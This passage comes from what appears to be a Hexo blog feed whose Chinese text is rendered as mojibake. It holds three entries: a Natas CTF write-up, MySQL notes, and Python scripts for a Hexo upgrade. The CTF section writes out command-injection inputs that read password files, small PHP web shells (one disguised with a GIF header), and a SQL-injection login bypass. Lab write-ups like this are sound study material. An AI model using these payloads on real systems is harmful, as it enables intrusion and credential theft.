è„šæœ¬ä¸­ç›´æ¥è¾“å‡ºå›¾åƒåˆ°æµè§ˆå™¨ã€‚</p><h3 id="å‚æ•°-Â¶"><a href="#å‚æ•°-Â¶" class="headerlink" title="å‚æ•° Â¶"></a>å‚æ•°<a href="https://www.php.net/manual/zh/function.passthru.php#refsect1-function.passthru-parameters"> Â¶</a></h3><ul><li><p><code>command</code></p><p>  è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚</p></li><li><p><code>return_var</code></p><p>  å¦‚æœæä¾› <code>return_var</code> å‚æ•°ï¼Œ Unix å‘½ä»¤çš„è¿”å›çŠ¶æ€ä¼šè¢«è®°å½•åˆ°æ­¤å‚æ•°ã€‚</p></li></ul></blockquote><p>å¯†ç å‡å­˜å‚¨åœ¨/etc/natas_webpassç›®å½•ä¸‹ï¼ˆç™¾åº¦æ¥çš„</p><p> <code>passthru(&quot;grep -i $key dictionary.txt&quot;);</code></p><p>å¹¶ä¸”åœ¨shellä¸­ï¼Œ#å¯ä»¥æ³¨é‡Šæ‰åé¢çš„</p><p>æ‰€ä»¥å½“</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$key</span> = | cat <span class="hljs-regexp">/etc/</span>natas_webpass/natas10 <span class="hljs-comment">#</span><br><span class="hljs-variable">$key</span> = &amp; cat <span class="hljs-regexp">/etc/</span>natas_webpass/natas10 <span class="hljs-comment">#</span><br><span class="hljs-variable">$key</span> = | cat <span class="hljs-regexp">/etc/</span>natas_webpass/natas10<br><span class="hljs-variable">$key</span> = &amp; cat <span class="hljs-regexp">/etc/</span>natas_webpass/natas10<br></code></pre></td></tr></table></figure><p>æ—¶ï¼Œå¯¹åº”çš„shellå‘½ä»¤ä¸º</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> -i | cat <span class="hljs-regexp">/etc/</span>natas_webpass/natas10 dictionary.txt<br><span class="hljs-keyword">grep</span> -i &amp; cat <span class="hljs-regexp">/etc/</span>natas_webpass/natas10<br></code></pre></td></tr></table></figure><p>è¿™æ ·éƒ½è¡Œ</p><h2 id="natas10"><a href="#natas10" class="headerlink" title="natas10"></a>natas10</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span> != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[;|&amp;]/&#x27;</span>,<span class="hljs-variable">$key</span>)) &#123;<br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Input contains an illegal character!&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        passthru(<span class="hljs-string">&quot;grep -i <span class="hljs-subst">$key</span> dictionary.txt&quot;</span>);<br>    &#125;<br><br></code></pre></td></tr></table></figure><blockquote><ul><li>Search in case-insensitive mode:<br>  grep -i search_string path/to/file</li></ul></blockquote><p>grepè¿˜å¯ä»¥ç”¨æ­£åˆ™ï¼Œæ‰€ä»¥è¿™é‡Œ</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$key</span> = [a-zA-Z] <span class="hljs-regexp">/etc/</span>natas_webpass/natas11 <span class="hljs-comment">#</span><br>grep -i [a-zA-Z] <span class="hljs-regexp">/etc/</span>natas_webpass/natas11 <span class="hljs-comment"># dictionary.txt</span><br></code></pre></td></tr></table></figure><h2 id="natas12"><a href="#natas12" class="headerlink" title="natas12"></a>natas12</h2><p>æŠŠæ–‡ä»¶åéšæœºäº†ï¼ŒæŠŠåç¼€æ”¹æˆjpgäº†</p><p>å†…å®¹æ²¡æœ‰æ£€æµ‹ï¼Œå°è¯•uploadçš„æ—¶å€™ç”¨bpæŠŠæ–‡ä»¶åç¼€æ”¹æˆphpå°±å¯ä»¥æ‰“å¼€ï¼Œé‚£</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><br>    passthru(<span class="hljs-string">&#x27;cat /etc/natas_webpass/natas13&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="natas13"><a href="#natas13" class="headerlink" title="natas13"></a>natas13</h2><p>é€šè¿‡ <code>php</code>çš„å‡½æ•° <code>exif_imagetype()</code> æ¥åˆ¤æ–­æ–‡ä»¶å¤¹ç±»å‹ï¼Œ</p><p>å¯ä»¥æŸ¥çœ‹phpçš„æ–‡æ¡£ï¼Œè¿™ä¸ªå‡½æ•°é€šè¿‡æ£€æŸ¥æ–‡ä»¶çš„ç­¾åï¼ˆç¬¬ä¸€ä¸ªå­—èŠ‚ï¼‰ï¼Œä»è€Œæ£€æµ‹æ–‡ä»¶ç±»å‹ã€‚</p><p>å¯ä»¥ç”¨<a href="https://blog.csdn.net/piaolankeke/article/details/5872876">GIF98a</a>æ¥éª—è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF98a<br><span class="hljs-meta">&lt;?</span><br>    passthru(<span class="hljs-string">&#x27;cat /etc/natas_webpass/natas14&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="natas14"><a href="#natas14" class="headerlink" title="natas14"></a>natas14</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;SELECT * from users where username=\&quot;&quot;</span>.<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;username&quot;</span>].<span class="hljs-string">&quot;\&quot; and password=\&quot;&quot;</span>.<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;password&quot;</span>].<span class="hljs-string">&quot;\&quot;&quot;</span>; <br></code></pre></td></tr></table></figure><p>ä¸‡èƒ½sqlå¯†ç <code>&quot; OR 1=1 #</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT * from users where username&#x3D;&quot;&quot; OR 1&#x3D;1 # and password&#x3D; &quot;&quot;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>æ•°æ®åº“ä½¿ç”¨&amp;å­¦ä¹ è®°å½•</title>
    <link href="/2020/05/19/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BD%BF%E7%94%A8&amp;%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/05/19/%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BD%BF%E7%94%A8&amp;%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="æƒé™"><a href="#æƒé™" class="headerlink" title="æƒé™"></a>æƒé™</h2><p>GRANT CREATE TABLE TO  { PUBLIC | GROUP group | username }</p><p>GRANT ALTER TABLE</p><p><a href="https://blog.csdn.net/haydenwang8287/article/details/2105999">Grantçš„ç”¨æ³•</a></p><h2 id="å¿˜è®°å¯†ç "><a href="#å¿˜è®°å¯†ç " class="headerlink" title="å¿˜è®°å¯†ç "></a>å¿˜è®°å¯†ç </h2><p>ä¸€ä¸ªçª—å£</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">mysqld</span> --<span class="hljs-comment">shared</span><span class="hljs-literal">-</span><span class="hljs-comment">memory</span> --<span class="hljs-comment">skip</span><span class="hljs-literal">-</span><span class="hljs-comment">grant</span><span class="hljs-literal">-</span><span class="hljs-comment">tables</span><br></code></pre></td></tr></table></figure><p>å¦ä¸€ä¸ªçª—å£</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysql -u root -p<br>//press enter<br>FLUSH <span class="hljs-keyword">PRIVILEGES</span><br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;ä½ è¦è®¾ç½®çš„å¯†ç &#x27;</span><br>FLUSH <span class="hljs-keyword">PRIVILEGES</span><br></code></pre></td></tr></table></figure><h2 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#DELETE FROM SeatInformation  <br><br><br>&#x2F;*DELETE FROM SeatInformation *&#x2F;<br>-- DELETE FROM SeatInformation<br></code></pre></td></tr></table></figure><h2 id="åˆ›å»ºç´¢å¼•"><a href="#åˆ›å»ºç´¢å¼•" class="headerlink" title="åˆ›å»ºç´¢å¼•"></a>åˆ›å»ºç´¢å¼•</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mysql"><br>&#x2F;&#x2F;æ™®é€šç´¢å¼•<br>CREATE INDEX indexName ON table_name(column_name)<br><br>&#x2F;&#x2F;å”¯ä¸€ç´¢å¼•<br>CREATE UNIQUE INDEX indexName ON table_name (column_name)<br><br>&#x2F;&#x2F;ä½¿ç”¨hashç´¢å¼•æ–¹æ³•<br>CREATE INDEX indexName ON table_name(column_name) using hash <br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>hexoå‡çº§è·³å‘</title>
    <link href="/2020/04/07/hexo%E5%8D%87%E7%BA%A7%E8%B7%B3%E5%9D%91/"/>
    <url>/2020/04/07/hexo%E5%8D%87%E7%BA%A7%E8%B7%B3%E5%9D%91/</url>
    
    <content type="html"><![CDATA[<p>åº”è¯¥æ˜¯ä»4.0å‡çº§åˆ°4.2ï¼Œ_config.ymlçš„æ›´æ”¹å°±ä¸è¯´äº†ï¼Œä¸»è¦è®²è®²æ˜¨å¤©æ™šä¸Šéƒ½å¹²äº†å•¥ï¼ˆåè¡€æ‚è‚</p><p>4.2å¤šäº†ä¸ªå‹é“¾ï¼ˆä¸‡æ¶èµ·æºï¼‰ä¸Šæ¥ä¹‹åï¼Œæœ€å¼€å§‹çš„å˜åŒ–å°±æ˜¯ï¼Œæ‰€æœ‰æ–‡ç« çš„æ—¥æœŸéƒ½å˜æˆäº†<strong>åˆ›å»ºæ—¶é—´</strong>ï¼Œå³ä¾¿<strong>ä¿®æ”¹æ—¶é—´</strong>æ¯”åˆ›å»ºæ—¶é—´è¿˜æ—©0.0</p><p>äºæ˜¯ï¼Œå†™äº†è„šæœ¬ç»™æ¯ä¸ªæ–‡ç« åŠ ä¸Šdateï¼Œç¡®å®šæœ€æ—©çš„å‘å¸ƒ/åˆ›å»ºæ—¶é—´ï¼Œå¹¶ä¸”ï¼Œæ²¡æœ‰è¿™ä¸ª<a href="https://hexo.io/zh-cn/docs/front-matter">Front-matter</a>æ˜¯ä¼šæŠ¥è«åå…¶å¦™çš„YAMLExceptionçš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> datetime<br>fpath = os.getcwd()<br>path=os.path.abspath(os.path.dirname(__file__))<br><span class="hljs-comment">#æ—¶é—´æˆ³å˜æˆ</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shift_time</span>(<span class="hljs-params">filename</span>):</span><br>    time_stamp_create = os.path.getctime(filename)<br>    time_stamp_modify = os.path.getmtime(filename)<br>    <span class="hljs-keyword">if</span> time_stamp_create &gt; time_stamp_modify:<br>        time_stamp = time_stamp_modify<br>    <span class="hljs-keyword">else</span> :<br>        time_stamp = time_stamp_create<br>    dateArray = datetime.datetime.fromtimestamp(time_stamp)  <br>    <span class="hljs-keyword">return</span> dateArray.strftime(<span class="hljs-string">&quot;%Y/%m/%d %H:%M:%S&quot;</span>) <br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">writeback</span>(<span class="hljs-params">filename,text</span>):</span><br>    s = <span class="hljs-string">&#x27;&#x27;</span>.join(text)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename , <span class="hljs-string">&quot;w&quot;</span> , encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>,) <span class="hljs-keyword">as</span> f:<br>        f.write(s)<br><br><span class="hljs-comment">#å°†æ–‡ä»¶åˆ›å»ºæ—¶é—´æˆ–ä¿®æ”¹æ—¶é—´ï¼Œæœ€æ—©çš„ä¸€ä¸ªï¼Œå†™å…¥dateä¸­ï¼Œä½œä¸ºæ–‡ç« æ—¶é—´</span><br><span class="hljs-keyword">for</span> parent, dirnames, filenames <span class="hljs-keyword">in</span> os.walk(fpath):<br>    <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> filenames:         <br>        temp=os.path.splitext(filename)<br>        file,<span class="hljs-built_in">type</span>=temp<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&quot;.md&quot;</span>:<br>            headline = <span class="hljs-literal">False</span><br>            head_exist = <span class="hljs-literal">False</span><br>            date_exist = <span class="hljs-literal">False</span><br>            line_num = <span class="hljs-literal">False</span><br>            create_date = shift_time(filename) <br>            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(filename,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>):<br>                line_num += <span class="hljs-number">1</span><br>                <span class="hljs-keyword">if</span> line == <span class="hljs-string">&quot;---\n&quot;</span>:<br>                    headline += <span class="hljs-number">1</span><br>                    <span class="hljs-keyword">continue</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;date:&quot;</span> <span class="hljs-keyword">in</span> line:<br>                    date_exist = <span class="hljs-literal">True</span><br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> headline == <span class="hljs-number">2</span>:<br>                    head_exist = <span class="hljs-literal">True</span><br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> line_num == <span class="hljs-number">10</span>:<br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> date_exist:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">elif</span> head_exist:<br>                text = []<br>                <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(filename,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>): <br>                    text.append(line)<br>                text.insert(<span class="hljs-number">1</span> , <span class="hljs-string">&quot;date: &quot;</span> + create_date + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>                writeback(filename,text)<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">else</span>:<br>                text = []<br>                <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(filename,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>): <br>                    text.append(line)<br>                text.insert(<span class="hljs-number">0</span> , <span class="hljs-string">&quot;---\ndate: &quot;</span> + create_date + <span class="hljs-string">&#x27;\n---\n&#x27;</span>)<br>                writeback(filename,text)<br></code></pre></td></tr></table></figure><p>è¿™éƒ¨åˆ†ä¿®æ”¹å¥½äº†ä¹‹åå‘¢ï¼Œè·‘èµ·æ¥æµ‹è¯•ä¹‹åå‘ç°å›¾ç‰‡åŠ è½½ä¸äº†äº†ï¼ŒåŸæ¥çš„hexo-assets-imageçš„å›¾ç‰‡srcåœ°å€æœ‰è¯¯ï¼Œæ²¡æ³•ç”¨äº†ï¼Œæ¢äº†<a href="https://github.com/cocowool/hexo-image-link">hexo-image-link</a>ä¹‹åï¼Œå¯ä»¥æ˜¯å¯ä»¥äº†ï¼Œä½†æ˜¯æˆ‘åŸå…ˆçš„ç»“æ„ä¸èƒ½ç”¨äº†QAQ</p><blockquote><p>åŸå…ˆæ˜¯å›¾ç‰‡éƒ½æ”¾åœ¨ markdown.assets/xxx.png è¿™æ ·çš„ï¼Œç°åœ¨æ ¹æ® å®˜æ–¹å’Œ image-link çš„å‘¢ï¼Œåªèƒ½æ”¹æˆ  markdown/xxx.png è¿™æ ·äº† äºæ˜¯åˆå†™äº†è¿™éƒ¨åˆ†ä»£ç QAQ</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#å…ˆæ‰¾åˆ°.assetsæ–‡ä»¶å¤¹ï¼Œç„¶åå†å»æ‰¾mdæ–‡ä»¶æ›¿æ¢æ‰æ–‡ä»¶é‡Œçš„xxx.assets/imageçš„.assets</span><br><span class="hljs-keyword">for</span> folder <span class="hljs-keyword">in</span> os.listdir():<br>    <span class="hljs-keyword">if</span> folder == <span class="hljs-string">&quot;.vscode&quot;</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> os.path.isdir(folder)==<span class="hljs-literal">True</span>:<br>        temp=os.path.splitext(folder)<br>        file,<span class="hljs-built_in">type</span>=temp<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&quot;.assets&quot;</span>:<br>            <span class="hljs-keyword">for</span> parent, dirnames, filenames <span class="hljs-keyword">in</span> os.walk(fpath):<br>                <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> filenames:  <br>                    <span class="hljs-keyword">if</span> filename == file + <span class="hljs-string">&#x27;.md&#x27;</span>:<br>                        text = []<br>                        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(filename,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>): <br>                            text.append(line.replace(<span class="hljs-string">&quot;.assets&quot;</span>,<span class="hljs-string">&quot;&quot;</span>))<br>                        writeback(file + <span class="hljs-string">&#x27;.md&#x27;</span>,text)<br>        new_name=folder.replace(<span class="hljs-string">&#x27;.assets&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>        os.rename(os.path.join(path,folder),os.path.join(path,new_name))<br></code></pre></td></tr></table></figure><p>å†åŠ ä¸Šè°ƒä¸‹typoraçš„<strong>æ’å…¥å›¾ç‰‡æ—¶</strong>æ”¹ä¸ºå¤åˆ¶åˆ°æŒ‡å®šè·¯å¾„å³å¯ã€‚</p><p>è¿™æ ·ï¼Œæˆ‘æœ¬åœ°çœ‹ä¹Ÿæ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œå‘å¸ƒå‡ºå»ä¹Ÿä¸ä¼šæœ‰é—®é¢˜ï¼Œè€¶âœŒ</p><p>æ‡’æ‰æ˜¯æœ€å¼ºç”Ÿäº§åŠ›ï¼ˆç¡®ä¿¡</p><p>æ‰€ä»¥ç°åœ¨å°±æ˜¯åŒå‡»Winclick.bat è·‘run.pyã€‚å†™å®Œå°±ä¸¢å˜¿å˜¿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#run.py</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> datetime<br>fpath = os.getcwd()<br>path=os.path.abspath(os.path.dirname(__file__))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shift_time</span>(<span class="hljs-params">filename</span>):</span><br>    time_stamp_create = os.path.getctime(filename)<br>    time_stamp_modify = os.path.getmtime(filename)<br>    <span class="hljs-keyword">if</span> time_stamp_create &gt; time_stamp_modify:<br>        time_stamp = time_stamp_modify<br>    <span class="hljs-keyword">else</span> :<br>        time_stamp = time_stamp_create<br>    dateArray = datetime.datetime.fromtimestamp(time_stamp)  <br>    <span class="hljs-keyword">return</span> dateArray.strftime(<span class="hljs-string">&quot;%Y/%m/%d %H:%M:%S&quot;</span>) <br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">writeback</span>(<span class="hljs-params">filename,text</span>):</span><br>    s = <span class="hljs-string">&#x27;&#x27;</span>.join(text)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename , <span class="hljs-string">&quot;w&quot;</span> , encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>,) <span class="hljs-keyword">as</span> f:<br>        f.write(s)<br><br><span class="hljs-comment">#å°†æ–‡ä»¶åˆ›å»ºæ—¶é—´æˆ–ä¿®æ”¹æ—¶é—´ï¼Œæœ€æ—©çš„ä¸€ä¸ªï¼Œå†™å…¥dateä¸­ï¼Œä½œä¸ºæ–‡ç« æ—¶é—´</span><br><span class="hljs-keyword">for</span> parent, dirnames, filenames <span class="hljs-keyword">in</span> os.walk(fpath):<br>    <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> filenames:         <br>        temp=os.path.splitext(filename)<br>        file,<span class="hljs-built_in">type</span>=temp<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&quot;.md&quot;</span>:<br>            headline = <span class="hljs-literal">False</span><br>            head_exist = <span class="hljs-literal">False</span><br>            date_exist = <span class="hljs-literal">False</span><br>            line_num = <span class="hljs-literal">False</span><br>            create_date = shift_time(filename) <br>            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(filename,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>):<br>                line_num += <span class="hljs-number">1</span><br>                <span class="hljs-keyword">if</span> line == <span class="hljs-string">&quot;---\n&quot;</span>:<br>                    headline += <span class="hljs-number">1</span><br>                    <span class="hljs-keyword">continue</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;date:&quot;</span> <span class="hljs-keyword">in</span> line:<br>                    date_exist = <span class="hljs-literal">True</span><br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> headline == <span class="hljs-number">2</span>:<br>                    head_exist = <span class="hljs-literal">True</span><br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> line_num == <span class="hljs-number">10</span>:<br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> date_exist:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">elif</span> head_exist:<br>                text = []<br>                <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(filename,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>): <br>                    text.append(line)<br>                text.insert(<span class="hljs-number">1</span> , <span class="hljs-string">&quot;date: &quot;</span> + create_date + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>                writeback(filename,text)<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">else</span>:<br>                text = []<br>                <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(filename,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>): <br>                    text.append(line)<br>                text.insert(<span class="hljs-number">0</span> , <span class="hljs-string">&quot;---\ndate: &quot;</span> + create_date + <span class="hljs-string">&#x27;\n---\n&#x27;</span>)<br>                writeback(filename,text)<br>   <br><span class="hljs-keyword">for</span> folder <span class="hljs-keyword">in</span> os.listdir():<br>    <span class="hljs-keyword">if</span> folder == <span class="hljs-string">&quot;.vscode&quot;</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> os.path.isdir(folder)==<span class="hljs-literal">True</span>:<br>        temp=os.path.splitext(folder)<br>        file,<span class="hljs-built_in">type</span>=temp<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> == <span class="hljs-string">&quot;.assets&quot;</span>:<br>            <span class="hljs-keyword">for</span> parent, dirnames, filenames <span class="hljs-keyword">in</span> os.walk(fpath):<br>                <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> filenames:  <br>                    <span class="hljs-keyword">if</span> filename == file + <span class="hljs-string">&#x27;.md&#x27;</span>:<br>                        text = []<br>                        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(filename,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>): <br>                            text.append(line.replace(<span class="hljs-string">&quot;.assets&quot;</span>,<span class="hljs-string">&quot;&quot;</span>))<br>                        writeback(file + <span class="hljs-string">&#x27;.md&#x27;</span>,text)<br>        new_name=folder.replace(<span class="hljs-string">&#x27;.assets&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>        os.rename(os.path.join(path,folder),os.path.join(path,new_name))<br><br>os.system((<span class="hljs-string">&#x27;cd &#123;&#125; &amp;&amp; hexo clean &amp;&amp; hexo gen &amp;&amp; hexo deploy&#x27;</span>).<span class="hljs-built_in">format</span>(path))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
